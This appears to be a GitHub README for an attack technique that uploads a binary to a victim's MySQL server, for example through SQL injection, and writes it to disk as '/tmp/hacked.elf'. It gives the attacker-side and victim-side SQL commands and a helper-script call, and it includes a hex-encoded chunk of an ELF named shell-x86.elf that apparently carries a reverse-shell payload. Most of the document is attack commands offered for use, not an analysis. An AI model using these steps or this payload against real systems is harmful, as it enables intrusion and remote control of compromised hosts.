# mysql-binary-upload
Upload a binary file through MySQL to a remote host.
If you want to transfer a binary file from your attacker machine to a remote host (eg. through SQLi where the underlying DBMS is MySQL), you can use the following technique.

1. Create a DUMPFILE containing the hexadecimal representation (as string) of the binary data
2. Use the Python helper script from this repository to divide the data into 1024 Byte sized chunks
3. Insert each chunk into a temporary table on the victim host
4. Finally the hexadecimal data gets parsed and its content dumped into a new file representing the initial one

![image](https://user-images.githubusercontent.com/49280556/118298041-3da71980-b4df-11eb-8c24-db59aa66f0a6.png)

As you can see the files are identical (shell-x86.elf is the original file, hacked.elf is the dumped file on the victim).

## Attacker
```mysql
SELECT HEX(LOAD_FILE('/home/malice/shell-x86.elf')) INTO DUMPFILE '/home/malice/shell.dmp';
```

```python3
python dmp-helper.py shell.dmp
```

## Victim
```mysql
CREATE TABLE tmp(chunk longtext);
```

```mysql
INSERT INTO tmp(chunk) VALUES(0x374634353443343630313031303130303030303030303030303030303030303030323030303330303031303030303030353438303034303833343030303030303030303030303030303030303030303033343030323030303031303030303030303030303030303030313030303030303030303030303030303038303034303830303830303430384346303030303030344130313030303030373030303030303030313030303030364130413545333144424637453335333433353336413032423036363839453143443830393735423638433041383830383036383032303030314242383945313641363635383530353135373839453134334344383038354330373931393445373433443638413230303030303035383641303036413035383945333331433943443830383543303739424445423237423230374239303031303030303038394533433145423043433145333043423037444344383038354330373831303542383945313939423232344230303343443830383543303738303246464531423830313030303030304242303130303030303043443830);
```

```mysql
SELECT UNHEX(chunk) FROM tmp INTO DUMPFILE '/tmp/hacked.elf';
```
